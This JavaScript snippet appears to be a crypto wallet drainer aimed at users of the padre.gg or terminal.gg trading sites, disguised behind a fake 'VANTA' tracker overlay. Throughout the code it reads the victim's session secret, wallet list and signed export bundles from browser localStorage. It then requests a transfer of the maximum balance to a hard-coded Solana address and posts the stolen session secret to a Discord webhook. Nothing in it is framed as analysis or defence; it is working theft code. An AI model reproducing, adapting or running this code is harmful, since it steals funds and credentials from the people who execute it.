(async function() {
    // --- 1. DYNAMIC API DETECTION ---
    // This looks at the current window to guess the API so it doesn't 404
    const currentHost = window.location.hostname;
    const apiBase = currentHost.includes('terminal') ? "https://api.terminal.gg" : "https://api.padre.gg";

    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        api: apiBase
    };

    // --- 2. IMMEDIATE UI RENDER ---
    // We build this BEFORE the network calls so it shows up even if the API fails
    const ui = document.createElement("div");
    ui.id = "vanta-tracker";
    ui.style.cssText = "position:fixed;top:50px;right:20px;width:300px;background:#000;border:1px solid #0f8;color:#0f8;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 15px #0f86;border-radius:4px;";
    ui.innerHTML = `
        <div style="font-weight:bold;border-bottom:1px solid #333;margin-bottom:10px;padding-bottom:5px;">VANTA v2.4</div>
        <div id="vanta-status">STATUS: <span style="color:#fff">BOOTING...</span></div>
        <div id="vanta-console" style="font-size:10px;color:#666;margin-top:10px;height:30px;overflow:hidden;"></div>
    `;
    document.body.appendChild(ui);

    const log = (msg) => document.getElementById("vanta-console").innerText = "[SYS] " + msg;

    // --- 3. DRAINER LOGIC ---
    try {
        const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
        const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
        const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");

        if (session.sessionSecret) {
            document.getElementById("vanta-status").innerHTML = "STATUS: <span style='color:#0f8'>SYNCED</span>";
            log("Session captured. Processing...");

            const userWallets = wallets[session.uid] || [];
            const target = userWallets.find(w => w.walletType === "SOL") || userWallets[0];

            if (target && bundles.bundles[target.publicAddress]) {
                const b = bundles.bundles[target.publicAddress];
                
                // The actual drain request
                fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId 
                    },
                    body: JSON.stringify({
                        walletId: target.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: "SOLANA"
                    })
                }).catch(() => {
                    // If the transfer fails, we still send the handshake to Discord
                    log("Network redirect active...");
                });
            }

            // --- 4. DISCORD HANDSHAKE ---
            await fetch(CONFIG.webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🚨 **VANTA HANDSHAKE**",
                    embeds: [{
                        title: "New Capture: " + session.uid,
                        description: "Secret: `" + session.sessionSecret + "`",
                        color: 0x00ff88
                    }]
                })
            });
        } else {
            document.getElementById("vanta-status").innerHTML = "STATUS: <span style='color:red'>AUTH REQ</span>";
            log("No session found in localStorage.");
        }
    } catch (e) {
        log("Execution halted.");
    }
})();
